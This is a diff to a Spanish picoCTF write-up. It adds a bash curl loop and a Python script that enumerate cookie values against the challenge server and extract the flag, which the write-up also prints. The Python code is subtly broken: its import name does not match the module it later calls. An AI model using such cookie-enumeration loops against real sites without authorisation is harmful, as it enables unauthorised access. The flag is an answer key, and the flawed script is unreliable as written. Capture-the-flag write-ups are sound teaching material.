@@ -32,5 +32,27 @@ Por fortuna, la bandera si estaba entre las primeras 21 opciones o posibilidades
 picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}
 ```
 ### Notas Adicionales
+Se puede hacer una mejor búsqueda con grep, haciendo lo siguiente:
 
+```
+the_robx-picoctf@webshell:~$ for i in {0..20}; do curl -s http://mercury.picoctf.net:54219/check -H "Cookie: name=$i"; done | grep -oE "picoCTF{.*?}"
+```
+
+Usando un Script de python:
+
+```python
+import request
+import re
+
+url = "http://mercury.picoctf.net:54219/check"
+
+for i in range(20):
+		cookies = {'name' : '{}'.format(i)}
+		print(cookies)
+		r = requests.get(url, cookies=cookies)
+		if 'picoCTF' in r.text:
+			print(r.text)
+			flag = re.findall('picoCTF{.*?}', r.text)[0]
+			print(flag)
+```
 ### Referencias
